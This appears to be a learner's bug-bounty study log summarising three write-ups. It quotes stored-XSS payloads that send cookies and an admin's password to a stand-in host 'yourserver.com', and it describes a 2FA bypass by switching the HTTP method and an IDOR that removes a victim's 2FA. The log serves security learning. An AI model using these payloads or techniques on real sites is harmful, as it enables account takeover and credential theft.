# Day-19 (30-Days-Of-Hacking)

### 1. Read 3 Article: [DONE]

- https://medium.com/@arthbajpai277/stored-xss-to-stealing-admin-credentials-to-your-domain-2ec10cb68bed
- https://medium.com/@arthbajpai277/2fa-bypass-by-changing-request-method-to-delete-500fd0ed12b8
- https://medium.com/@arthbajpai277/idor-leads-to-2fa-bypass-3331cec2db64

#### Learned:

1. From Article 1:
      - Website had some pretty Good Features and One of them was posting Stuff on Your Timeline or posting Articles. This kind of features has a higher chance of consisting bugs. So posting feature immediately Got my Attention and I started testing it.
      - So I entered the Self XSS Payload `“><img src=x onerror=alert(1)>` and tried approving the POST from admin account and I got POP Up in Admin Account, I tried testing `“><img src=x onerror=alert(document.cookie)>` to see if I can obtain cookies with this and I got a POP with some cookies as well.
	  - I spent My next 2 hours to Get this working and getting cookie on my domain, The Final Payload for this was `<script>new Image().src=”http://yourserver.com/abc.php?output="+document.cookie;</script>` 
     -  I spent another 2 hours to shorten the payload within the word limit and the final payload was :
`<input name=s id=email>
<input type=password name=a
onchange=”if(this.value.length)fetch(‘http://yourserver.com',
{
method:’POST’,
body:’:’+this.value
});”>`	
I entered the Payload in POST and when admin approved the Payload his Password was sent to victim server.
     
2. From Article 2:
    - So I thought About disabling it to check 2fa disable functionality, It had a button placed in front of 2fa to disable it and the best part was it didn’t require a password and was a single click 2fa disable.
    - I thought why not try changing request method on 2fa screen itself as there is just a slight change in request on resending sms and deleting 2fa and there is no password confirmation on disabling 2fa plus it validates requests based on cookie and it was generated at the time of login so it was very much possible.
    - so resend sms request kinda looked like : `POST /api/v2/mfa/resend`, and delete one kinda looks like : `DELETE /api/v2/mfa`
    - I entered Id Password and got to 2fa screen, where I needed to enter correct OTP to get into account.
    - I clicked on Resend SMS, took request on burp and changed the request method from POST to DELETE and removed resend from it and forwarded the request and boom 2fa disabled.

3. From Article 3:
    - I noticed they have a 2fa function , I tried 2fa bypass by response manipulations and with few other methods, weak 2fa implementation etc but didn’t find any success,I again noticed they have a function of removing 2fa using secret code if you don’t have access to your google authenticator, the secret code was bit long probably 8–9 digit long.
    - So website had login using multiple methods, So when you login using magic link or email password it asks you to enter 2fa code to get access to it, So I logged in using magic link and it asked me to enter 2fa code , there I noticed a option of “RESET 2FA” , I immediately clicked on it and it asked me to enter the Secret Key there, I entered the correct key there but it showed me error.
    - Now comes the Interesting part, it had 2 Parameters only, `“email”:”user_email”` , `“RecoveryKey”:”123456789"` , So the reason it was giving error because it was not able to self pick the email in email parameter through login details, as I was login using magic link .
    - I got excited again as I got a feeling that here that IDOR could work, I immediately entered the victim email and Recovery Key and “BOOM” the 2fa of victim was removed successfully.


### 2. TryHackMe Labs: [HALF DONE, THIS ROOM IS HARDDDDDDDDDDDD]

 - [X] Solved 2 More hashes Of **Crack The Hash Level 2** : (https://tryhackme.com/room/crackthehashlevel2)

### 3. PortSwigger Labs: [DONE]

 - [X] **Authentication (5/14)**
 -  Lab: Username enumeration via response timing   (https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

### 4. Youtube Video: [DONE]

- Learn with Remonsec: How to approach sensitive information disclosure. (https://www.youtube.com/watch?v=0EyVb0x-oJU)
